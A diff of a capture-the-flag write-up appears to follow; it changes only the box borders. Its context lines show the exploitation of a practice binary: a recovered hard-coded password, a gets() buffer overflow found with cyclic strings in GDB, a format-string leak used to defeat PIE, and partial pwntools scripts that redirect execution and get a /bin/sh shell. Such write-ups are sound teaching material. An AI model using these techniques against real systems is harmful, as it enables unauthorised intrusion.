@@ -53,7 +53,7 @@ function when passed the `0xdead` (`57005` in decimal) value.
 `admin` function decompiled:
 
 
-+-------------------------~<]  Ghidra Disassembly  [>~-------------------------+
+--------------------------~<]  Ghidra Disassembly  [>~--------------------------
 void admin(void)
 {
   int iVar1;
@@ -123,7 +123,7 @@ void admin(void)
   }
   return;
 }
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 This function can clearly print a flag, so let's try that first.
@@ -137,7 +137,7 @@ Alright, now all we have to do is find the password.
 Looking at the `admin` decompiled code, this part is interesting:
 
 
-+-------------------------~<]  Ghidra Disassembly  [>~-------------------------+
+--------------------------~<]  Ghidra Disassembly  [>~--------------------------
   local_4c = 0;
   local_44 = 0;
   local_68 = 0;
@@ -154,7 +154,7 @@ Looking at the `admin` decompiled code, this part is interesting:
   iVar1 = memcmp(&local_68,&local_78,0x10);
   if (iVar1 == 0) {
     local_10 = fopen("flag1.txt","r");
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 It compares the `local_68` and `local_78` buffers of `0x10` bytes, where 
@@ -170,10 +170,10 @@ Since `chal1` is little endian (LSB, see the file command screenshot), we need
 to swap endianness.
 
 
-+-------------------------~<]  Ghidra Disassembly  [>~-------------------------+
+--------------------------~<]  Ghidra Disassembly  [>~--------------------------
   local_78 = 0x4551207ed67005b4;
   local_70 = 0x4621e6068943f87f;
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 [~ cyberchef output - /public/pictures/2024-10-14/swap-endianness.png ~]
@@ -195,7 +195,7 @@ the first flag.
 After obtaining the first flag, this code is executed in the `admin` function:
 
 
-+-------------------------~<]  Ghidra Disassembly  [>~-------------------------+
+--------------------------~<]  Ghidra Disassembly  [>~--------------------------
 local_10 = fopen("flag1.txt","r");
 if (local_10 == (FILE *)0x0) {
     puts("ERROR! The flag cannot be read! Contact the designer!");
@@ -210,7 +210,7 @@ puts("You\'re admin! We can trust you! Give us your instruction!");
 gets((char *)&local_42);
 puts("NB: Your instruction will not be recorded for the moment. 
       We will fix the problem one day!");
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 The `gets` function call does not check buffer size and can seemingly overflow.
@@ -228,13 +228,13 @@ at which we overwrite the `rip` register.
 Let's first print a cyclic string to calculate the offset
 
 
-+----------------------------~<]  Python REPL  [>~-----------------------------+
+-----------------------------~<]  Python REPL  [>~------------------------------
 $ python
 >>> import pwn
 >>> pwn.cyclic(150)
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
 uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 Then let's open the executable in GDB, and print a cyclic string into the `gets`
@@ -244,14 +244,14 @@ Enter the `admin` function with `57005` and the `bubbles1` password, then print
 the cyclic string. The program should get a segmentation fault
 
 
-+----------------------------~<]  GDB session  [>~-----------------------------+
+-----------------------------~<]  GDB session  [>~------------------------------
 gdb ./chal1
 run
 57005
 bubbles1
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
 uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 [~ SIGSEGV - /public/pictures/2024-10-14/sigsegv.png ~]
@@ -284,10 +284,10 @@ Now let's open GDB and `disass vote`, and set a breakpoint to the function
 instruction offset. 
 
 
-+----------------------------~<]  GDB session  [>~-----------------------------+
+-----------------------------~<]  GDB session  [>~------------------------------
 gdb ./chal1
 disass vote
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 In the output, we can find the corresponding address and instruction offset. We 
@@ -299,10 +299,10 @@ first time with `PIE`.
 We add a breakpoint to it and run the program:
 
 
-+----------------------------~<]  GDB session  [>~-----------------------------+
+-----------------------------~<]  GDB session  [>~------------------------------
 break *vote+381
 run
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 [~ vote execution with %p - /public/pictures/2024-10-14/vote_1.png ~]
@@ -361,7 +361,7 @@ hidden menu, enter the password, then enter the calculated address of the `flag`
 function at the correct offset to redirect execution to print the flag.
 
 
-+-------------------------------~<]  Python  [>~-------------------------------+
+--------------------------------~<]  Python  [>~--------------------------------
 from pwn import *
 
 context(os='linux', arch='amd64')
@@ -401,7 +401,7 @@ p.sendlineafter(b'You\'re admin! We can trust you! Give us your instruction!',
                   payload)
 
 p.interactive()
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 Then execute it `python exploit2.py` (you would uncomment the remote part if it 
@@ -464,7 +464,7 @@ Here's the updated pwntools script, only the last section for the payload is
 changed
 
 
-+-------------------------------~<]  Python  [>~-------------------------------+
+--------------------------------~<]  Python  [>~--------------------------------
 # ...
 base_addr = int(addr, 16) - 0x001020c7
 flag_function_addr = base_addr + 0x00101f18
@@ -485,7 +485,7 @@ p.sendlineafter(b'You\'re admin! We can trust you! Give us your instruction!',
                 payload)
 
 p.interactive()
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 Running it gives a `/bin/sh` shell which we use to print the flag
